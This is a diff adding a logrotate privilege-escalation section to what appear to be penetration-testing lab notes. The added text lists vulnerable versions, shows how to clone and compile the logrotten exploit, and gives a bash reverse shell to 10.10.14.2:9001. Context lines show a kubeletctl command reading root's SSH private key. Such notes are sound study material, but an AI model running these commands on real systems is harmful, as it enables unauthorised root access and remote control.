@@ -437,3 +437,34 @@ $ kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc 
 
 -----BEGIN OPENSSH PRIVATE KEY-----
 ```
+
+# Logrotate 
+1. we need write permissions on the log files
+2. logrotate must run as a privileged user or root
+3. vulnerable versions:
+    - 3.8.6
+    - 3.11.0
+    - 3.15.0
+    - 3.18.0
+
+here is the exploit [logrotten](https://github.com/whotwagner/logrotten)
+
+- We can download and compile it on a similar kernel of the target system and then transfer it to the target system.
+- or if we can compile the code on the target system.
+```shell
+git clone https://github.com/whotwagner/logrotten.git
+cd logrotten
+gcc logrotten.c -o logrotten
+```
+payload
+```
+$ echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
+```
+before running the exploit, we need to determine which option logrotate uses in logrotate.conf.
+```
+$ grep "create\|compress" /etc/logrotate.conf | grep -v "#"
+```
+In our case, it is the option: create. Therefore we have to use the exploit adapted to this function.
+```
+$ ./logrotten -p ./payload /tmp/tmp.log
+```
